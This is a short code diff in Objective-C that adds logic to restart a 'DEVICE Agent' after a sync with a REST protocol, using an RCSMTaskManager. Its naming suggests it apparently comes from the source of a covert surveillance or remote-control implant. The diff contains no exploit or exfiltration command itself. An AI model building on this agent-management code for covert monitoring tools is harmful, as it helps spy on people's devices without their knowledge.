@@ -235,6 +235,33 @@
           errorLog(@"An error occurred while syncing with REST proto");
 #endif
         }
+      else
+      {
+        BOOL bSuccess = NO;
+        
+        RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+      
+        NSMutableDictionary *agentConfiguration = [taskManager getConfigForAgent: LOGTYPE_DEVICE];
+      
+        deviceStruct *tmpDevice = 
+        (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
+        
+        if (tmpDevice != nil &&
+            tmpDevice->isEnabled == AGENT_DEV_ENABLED)
+        {          
+          bSuccess =[taskManager startAgent: LOGTYPE_DEVICE];
+          
+#ifdef DEBUG_ACTIONS
+          NSLog(@"%s: sync performed... restarting DEVICE Agent %d", __FUNCTION__, bSuccess);
+#endif
+        }
+        else
+        {
+#ifdef DEBUG_ACTIONS
+          NSLog(@"%s: sync performed... DEVICE Agent dont restarted", __FUNCTION__);
+#endif
+        }
+      }
       [protocol release];
     }
   
